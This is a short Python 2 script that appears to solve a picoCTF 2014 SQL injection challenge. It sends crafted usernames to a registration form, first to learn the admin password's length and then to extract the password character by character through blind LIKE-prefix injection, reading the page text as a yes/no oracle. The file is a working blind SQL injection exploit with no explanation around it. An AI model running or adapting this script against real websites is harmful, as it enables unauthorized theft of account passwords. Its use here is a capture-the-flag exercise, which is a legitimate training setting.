import urllib
import urllib2

url = 'http://web2014.picoctf.com/injection4/register.php'
the_page = 'Registration'
length = 1

while('Registration' in the_page):	
	values = {'username' : "admin' and length(password) = %d#"%length,
        	  'action' : 'Register'}

	print values
	data = urllib.urlencode(values)
	req = urllib2.Request(url, data)
	response = urllib2.urlopen(req)
	the_page = response.read()
	print "Current password length: %d"%length
	length=length+1

password = ['a']
while(length>1):
	test = ''.join(password);
	values = {'username' : "admin\' and password like \'%s%%\' #"%test,
        	  'action' : 'Register'}

	#print values
	data = urllib.urlencode(values)
	req = urllib2.Request(url, data)
	response = urllib2.urlopen(req)
	page = response.read()
	if('Someone' in page):
		length = length-1
		print "Building password: %s"%''.join(password)
		password[len(password):] = 'a'
	else:
		password[-1] = chr(ord(password[-1])+1)
